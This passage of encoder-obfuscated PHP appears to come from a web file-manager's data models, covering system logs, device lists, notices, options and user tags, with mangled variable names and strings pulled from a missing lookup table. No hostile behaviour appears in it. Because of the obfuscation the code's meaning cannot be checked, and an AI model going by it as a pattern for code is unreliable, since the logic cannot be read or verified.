continue; } $¨éÂ“Œ÷[] = $ò™Æúµ£[$à§ì”É[183]]; $¨éÂ“Œ÷[] = $ò™Æúµ£[$à§ì”É[2123]]; if ($ò™Æúµ£[$à§ì”É[33]] == $à§ì”É[591]) { $¨éÂ“Œ÷[] = $ò™Æúµ£[$à§ì”É[496]][$à§ì”É[1208]]; $¨éÂ“Œ÷[] = $ò™Æúµ£[$à§ì”É[496]][$à§ì”É[1209]]; } if ($ò™Æúµ£[$à§ì”É[33]] == $à§ì”É[2133]) { $¨éÂ“Œ÷[] = $ò™Æúµ£[$à§ì”É[496]][$à§ì”É[183]]; } } if (!$¨éÂ“Œ÷) { return array(); } return Model($à§ì”É[865])->sourceListInfo($¨éÂ“Œ÷, !0); } private function logList($í‚ï˜çç) { $«Ù¯Ú»¿ =& $_SERVER[èùÙ¹Ïö]; $ÏßúîÛ = array_to_keyvalue($í‚ï˜çç, $«Ù¯Ú»¿[12], $«Ù¯Ú»¿[1696]); $©ÅÅ€¾ô = Model($«Ù¯Ú»¿[570])->userListInfo(array_unique($ÏßúîÛ)); $¢Õ‰Ä™¥ = $this->getSourceList($í‚ï˜çç); $óÀƒ¡è´ = $this->typeAll(); $‘Ë†³ = array(); $”¡†œåğ = array(); foreach ($í‚ï˜çç as $Ñğ„¶İ˜ => $Ò™¶ô˜Ñ) { $¦ªòèÒî = $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[33]]; $ÈşóŞ¨ = isset($©ÅÅ€¾ô[$Ò™¶ô˜Ñ[$«Ù¯Ú»¿[1696]]]) ? $©ÅÅ€¾ô[$Ò™¶ô˜Ñ[$«Ù¯Ú»¿[1696]]] : !1; $şÏÁÃ•Á = strpos($¦ªòèÒî, $«Ù¯Ú»¿[2326]) === 0 ? LNG($«Ù¯Ú»¿[2327]) : LNG($«Ù¯Ú»¿[2322]); $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[32]] = isset($ÈşóŞ¨[$«Ù¯Ú»¿[32]]) ? $ÈşóŞ¨[$«Ù¯Ú»¿[32]] : LNG($«Ù¯Ú»¿[2322]); $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[2177]] = isset($ÈşóŞ¨[$«Ù¯Ú»¿[2177]]) ? $ÈşóŞ¨[$«Ù¯Ú»¿[2177]] : $«Ù¯Ú»¿[12]; $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[1592]] = isset($óÀƒ¡è´[$¦ªòèÒî]) ? $óÀƒ¡è´[$¦ªòèÒî] : $şÏÁÃ•Á; $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[2067]] = $ÈşóŞ¨; $ÑêÆ°“ = json_decode($Ò™¶ô˜Ñ[$«Ù¯Ú»¿[496]], !0); $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[2319]] = isset($ÑêÆ°“[$«Ù¯Ú»¿[2319]]) ? $ÑêÆ°“[$«Ù¯Ú»¿[2319]] : $«Ù¯Ú»¿[12]; $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[2323]] = IpLocation::get($Ò™¶ô˜Ñ[$«Ù¯Ú»¿[2319]]); if (strpos($¦ªòèÒî, $«Ù¯Ú»¿[2125]) === 0 || isset($ÑêÆ°“[$«Ù¯Ú»¿[2123]])) { $ÑêÆ°“[$«Ù¯Ú»¿[89]] = $¢Õ‰Ä™¥[$ÑêÆ°“[$«Ù¯Ú»¿[183]]]; $ÑêÆ°“[$«Ù¯Ú»¿[2138]] = $¢Õ‰Ä™¥[$ÑêÆ°“[$«Ù¯Ú»¿[2123]]]; if ($ÑêÆ°“[$«Ù¯Ú»¿[33]] == $«Ù¯Ú»¿[591]) { $ÑêÆ°“[$«Ù¯Ú»¿[496]][$«Ù¯Ú»¿[1208]] = $¢Õ‰Ä™¥[$ÑêÆ°“[$«Ù¯Ú»¿[496]][$«Ù¯Ú»¿[1208]]]; $ÑêÆ°“[$«Ù¯Ú»¿[496]][$«Ù¯Ú»¿[1209]] = $¢Õ‰Ä™¥[$ÑêÆ°“[$«Ù¯Ú»¿[496]][$«Ù¯Ú»¿[1209]]]; } if ($ÑêÆ°“[$«Ù¯Ú»¿[33]] == $«Ù¯Ú»¿[2133]) { $ÑêÆ°“[$«Ù¯Ú»¿[496]][$«Ù¯Ú»¿[183]] = $¢Õ‰Ä™¥[$ÑêÆ°“[$«Ù¯Ú»¿[496]][$«Ù¯Ú»¿[183]]]; } if ($ÑêÆ°“[$«Ù¯Ú»¿[33]] == $«Ù¯Ú»¿[1863]) { $ÑêÆ°“[$«Ù¯Ú»¿[2138]] = $ÑêÆ°“[$«Ù¯Ú»¿[89]]; $ÑêÆ°“[$«Ù¯Ú»¿[2123]] = $ÑêÆ°“[$«Ù¯Ú»¿[2138]][$«Ù¯Ú»¿[183]]; $ÑêÆ°“[$«Ù¯Ú»¿[89]] = !1; $ÑêÆ°“[$«Ù¯Ú»¿[183]] = $«Ù¯Ú»¿[12]; } if ($ÑêÆ°“[$«Ù¯Ú»¿[89]] && $ÑêÆ°“[$«Ù¯Ú»¿[89]][$«Ù¯Ú»¿[180]] == $«Ù¯Ú»¿[181]) { $”¡†œåğ[] = $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[445]]; unset($í‚ï˜çç[$Ñğ„¶İ˜]); continue; } if ($ÑêÆ°“[$«Ù¯Ú»¿[2138]] && $ÑêÆ°“[$«Ù¯Ú»¿[2138]][$«Ù¯Ú»¿[180]] == $«Ù¯Ú»¿[181]) { $”¡†œåğ[] = $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[445]]; unset($í‚ï˜çç[$Ñğ„¶İ˜]); continue; } } $Ò™¶ô˜Ñ[$«Ù¯Ú»¿[496]] = $ÑêÆ°“; unset($Ò™¶ô˜Ñ[$«Ù¯Ú»¿[2328]]); $‘Ë†³[] = $Ò™¶ô˜Ñ; } $this->clearSystemPathLog($”¡†œåğ); return $‘Ë†³; } private function clearSystemPathLog($³ÇÌËÈ‘) { $ğÈ‘Ç—­ =& $_SERVER[èùÙ¹Ïö]; if (count($³ÇÌËÈ‘) == 0) { return; } $‹âŞ¦í = array($ğÈ‘Ç—­[445] => array($ğÈ‘Ç—­[7], array_unique($³ÇÌËÈ‘))); $this->where($‹âŞ¦í)->delete(); } public function deviceList($µõÊŒĞá, $Â’•›Û¥ = 0) { $Ù¼øÈ’ =& $_SERVER[èùÙ¹Ïö]; $‘ˆ¥ò = array($Ù¼øÈ’[1696] => $µõÊŒĞá, $Ù¼øÈ’[217] => array($Ù¼øÈ’[1060], $Â’•›Û¥), $Ù¼øÈ’[33] => $Ù¼øÈ’[1837]); $¤òİ‡¾« = array(); $ãŠÎİù‚ = $this->field($Ù¼øÈ’[2329])->where($‘ˆ¥ò)->order($Ù¼øÈ’[2136])->limit(50)->select(); foreach ($ãŠÎİù‚ as $Ïşúİ–µ => $úáæµˆâ) { if ($Ïşúİ–µ > 0 && abs($úáæµˆâ[$Ù¼øÈ’[217]] - $ãŠÎİù‚[$Ïşúİ–µ - 1][$Ù¼øÈ’[217]]) < 5) { continue; } $ü„ŸëØ = json_decode($úáæµˆâ[$Ù¼øÈ’[496]], !0); $úáæµˆâ[$Ù¼øÈ’[2319]] = isset($ü„ŸëØ[$Ù¼øÈ’[2319]]) ? $ü„ŸëØ[$Ù¼øÈ’[2319]] : $Ù¼øÈ’[12]; unset($ü„ŸëØ[$Ù¼øÈ’[2319]]); $•Ó© ßï = $this->deviceType($ü„ŸëØ[$Ù¼øÈ’[2126]]); if (isset($¤òİ‡¾«[$•Ó© ßï])) { continue; } $úáæµˆâ[$Ù¼øÈ’[2323]] = IpLocation::get($úáæµˆâ[$Ù¼øÈ’[2319]]); $úáæµˆâ[$Ù¼øÈ’[496]] = $ü„ŸëØ; $¤òİ‡¾«[$•Ó© ßï] = $úáæµˆâ; } return array_values($¤òİ‡¾«); } public function deviceType($‘ÇÔÚáÏ) { return $‘ÇÔÚáÏ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\156\157\164\151\x63\145\x4c\151\x73\x74"; public $field = array("\156\141\155\x65", "\143\157\x6e\x74\x65\x6e\x74", "\x61\165\x74\x68", "\x6d\x6f\144\x65", "\164\x69\x6d\x65", "\164\x79\x70\x65", "\x6c\x65\x76\x65\154", "\x65\156\x61\142\x6c\x65", "\163\x6f\162\164"); public function listData($Èí¯ıƒñ = false, $áÉ ‘úÚ = "\x73\x6f\x72\164", $«ÀÇ¶ŠØ = false) { return parent::listData($Èí¯ıƒñ, $áÉ ‘úÚ, $«ÀÇ¶ŠØ); } public function add($Ü¤ş„) { $ÍÅ¾¨»¡ =& $_SERVER[èùÙ¹Ïö]; $­Õ•¸îÇ = time(); if ($Ü¤ş„[$ÍÅ¾¨»¡[16]] == $ÍÅ¾¨»¡[2330]) { $­Õ•¸îÇ = strtotime($Ü¤ş„[$ÍÅ¾¨»¡[196]]); } $Ü¤ş„[$ÍÅ¾¨»¡[196]] = $­Õ•¸îÇ; return parent::insert($Ü¤ş„); } public function update($ºÊÁÙ·€, $µÎ») { $õÒÄ¤Íä =& $_SERVER[èùÙ¹Ïö]; $«ğ¬À—Ù = $this->listData($ºÊÁÙ·€); if (!$«ğ¬À—Ù) { return !1; } $†°ÀÅêĞ = time(); if ($µÎ»[$õÒÄ¤Íä[16]] == $õÒÄ¤Íä[2330]) { $†°ÀÅêĞ = strtotime($µÎ»[$õÒÄ¤Íä[196]]); } $µÎ»[$õÒÄ¤Íä[196]] = $†°ÀÅêĞ; return parent::update($ºÊÁÙ·€, $µÎ»); } public function remove($–°ñÀ®) { $´Õ†ÛÜ¾ = $this->listData($–°ñÀ®); if (!$´Õ†ÛÜ¾ || $´Õ†ÛÜ¾[$_SERVER[èùÙ¹Ïö][181]]) { return !1; } return parent::remove($–°ñÀ®); } public function sort($…üÓªÒ¾, $ÚŞƒÓÏË) { return parent::update($…üÓªÒ¾, $ÚŞƒÓÏË); } public function enable($¼·Õ¸Ş, $ëÍœ¼Ù) { return parent::update($¼·Õ¸Ş, array($_SERVER[èùÙ¹Ïö][2331] => $ëÍœ¼Ù)); } private function initUserOption() { $¿ÎğÛ” =& $_SERVER[èùÙ¹Ïö]; $this->optionType = $¿ÎğÛ”[2332]; $this->modelType = $¿ÎğÛ”[2333]; $this->field = array($¿ÎğÛ”[2334], $¿ÎğÛ”[32], $¿ÎğÛ”[196], $¿ÎğÛ”[33], $¿ÎğÛ”[2335], $¿ÎğÛ”[790], $¿ÎğÛ”[212]); } public function userNoticeGet($ş­ûê§­ = false) { $this->initUserOption(); return parent::listData($ş­ûê§­, $_SERVER[èùÙ¹Ïö][445], !0); } public function userNoticeAdd($şíÜéÌ) { $èÒÉÇ©µ =& $_SERVER[èùÙ¹Ïö]; $this->initUserOption(); $Çä§Ö¸Ú = $this->findByKey($èÒÉÇ©µ[2334], $şíÜéÌ[$èÒÉÇ©µ[445]]); if ($Çä§Ö¸Ú) { return !0; } $×¢è‰É = array($èÒÉÇ©µ[2334] => $şíÜéÌ[$èÒÉÇ©µ[445]], $èÒÉÇ©µ[32] => $şíÜéÌ[$èÒÉÇ©µ[32]], $èÒÉÇ©µ[196] => $şíÜéÌ[$èÒÉÇ©µ[196]], $èÒÉÇ©µ[33] => isset($şíÜéÌ[$èÒÉÇ©µ[33]]) ? $şíÜéÌ[$èÒÉÇ©µ[33]] : 1, $èÒÉÇ©µ[2335] => isset($şíÜéÌ[$èÒÉÇ©µ[2335]]) ? $şíÜéÌ[$èÒÉÇ©µ[2335]] : 0, $èÒÉÇ©µ[790] => 0, $èÒÉÇ©µ[212] => 0); return parent::insert($×¢è‰É); } public function userNoticeEdit($÷œìâØ¬, $‘æ«»Ó) { $this->initUserOption(); return parent::update($÷œìâØ¬, $‘æ«»Ó); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\x65\155\137\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\145\x6e\165", "\162\157\154\145", "\x72\x6f\x6c\x65\x47\162\157\x75\160", "\x72\x65\147\x69\163\164", "\145\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($’á‘„Ù) { return "\123\171\163\164\x65\155\x4f\160\x74\x69\157\156\x5f{$’á‘„Ù}"; } protected function optionDefault($òĞ²ÒóÀ = '') { $â—ğ­¯¿ =& $_SERVER[èùÙ¹Ïö]; if ($òĞ²ÒóÀ == $â—ğ­¯¿[12]) { return $GLOBALS[$â—ğ­¯¿[6]][$â—ğ­¯¿[427]]; } } } goto Eí©¿™ÇÚê; B‰Åå—º: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($µıÓç¡ï) { $ßçŒû³„ =& $_SERVER[èùÙ¹Ïö]; return array($ßçŒû³„[2005] => array($ßçŒû³„[2396] . USER_ID, $ßçŒû³„[2006])); } protected function listData() { $Ä‚¥ü’ª =& $_SERVER[èùÙ¹Ïö]; $˜ÄÅ¨ö‰ = array($Ä‚¥ü’ª[1687] => USER_ID, $Ä‚¥ü’ª[528] => array($Ä‚¥ü’ª[2009], 0)); $—üáØü© = $Ä‚¥ü’ª[2397]; $ÏÔ…ô¯Ç = $this->field($—üáØü©)->where($˜ÄÅ¨ö‰)->order($Ä‚¥ü’ª[2012])->select(); return $ÏÔ…ô¯Ç ? $ÏÔ…ô¯Ç : array(); } protected function addToTag($ÆËƒÅŞ£, $³»¤ûÀ) { $ó® ÏÙ® =& $_SERVER[èùÙ¹Ïö]; if (!Model($ó® ÏÙ®[2155])->listData($³»¤ûÀ)) { return !1; } if (is_numeric($ÆËƒÅŞ£)) { $ƒïì±Í´ = Model($ó® ÏÙ®[865])->pathInfo($ÆËƒÅŞ£); if (!$ƒïì±Í´) { return !1; } } else { $ƒïì±Í´ = IO::infoSimple($ÆËƒÅŞ£); if (!$ƒïì±Í´) { return !1; } $˜¹¤’ºï = $ƒïì±Í´[$ó® ÏÙ®[32]]; $ˆÎ¯Ü”“ = $ƒïì±Í´[$ó® ÏÙ®[33]]; if (isset($ƒïì±Í´[$ó® ÏÙ®[455]])) { $ˆÎ¯Ü”“ = $ƒïì±Í´[$ó® ÏÙ®[455]] == $ó® ÏÙ®[90] ? $ó® ÏÙ®[77] : $ó® ÏÙ®[216]; } } $—¢íŒ”» = array($ó® ÏÙ®[1687] => USER_ID, $ó® ÏÙ®[528] => $³»¤ûÀ, $ó® ÏÙ®[465] => $ÆËƒÅŞ£, $ó® ÏÙ®[466] => $ˆÎ¯Ü”“ ? $ˆÎ¯Ü”“ : $ó® ÏÙ®[460], $ó® ÏÙ®[464] => $˜¹¤’ºï ? $˜¹¤’ºï : $ó® ÏÙ®[12], $ó® ÏÙ®[1898] => 0); if ($this->where($—¢íŒ”»)->find()) { return !1; } return $this->add($—¢íŒ”»); } protected function removeFromTag($ı”Õ“ã×, $Í¥«ˆÛ) { $»ìÌ ¼ª =& $_SERVER[èùÙ¹Ïö]; if (!Model($»ìÌ ¼ª[2155])->listData($Í¥«ˆÛ)) { return !1; } if (is_array($ı”Õ“ã×)) { $ı”Õ“ã× = array($»ìÌ ¼ª[7], $ı”Õ“ã×); } $ùÔ¡ê· = array($»ìÌ ¼ª[1687] => USER_ID, $»ìÌ ¼ª[528] => $Í¥«ˆÛ, $»ìÌ ¼ª[465] => $ı”Õ“ã×); return $this->where($ùÔ¡ê·)->delete(); } protected function removeByTag($Ûî”Æ®) { $ÜùÌİ·å =& $_SERVER[èùÙ¹Ïö]; if (!$Ûî”Æ®) { return !1; } $¦ùŒÜçÁ = array($ÜùÌİ·å[1687] => USER_ID, $ÜùÌİ·å[528] => $Ûî”Æ®); return $this->where($¦ùŒÜçÁ)->delete(); } protected function removeBySource($´¨ì¸Âä) { $úáŠÕá =& $_SERVER[èùÙ¹Ïö]; if (is_array($´¨ì¸Âä)) { $´¨ì¸Âä = array($úáŠÕá[7], $´¨ì¸Âä); } $Ó‰Ô¼òÈ = array($úáŠÕá[1687] => USER_ID, $úáŠÕá[528] => array($úáŠÕá[1060], 0), $úáŠÕá[465] => $´¨ì¸Âä); return $this->where($Ó‰Ô¼òÈ)->delete(); } }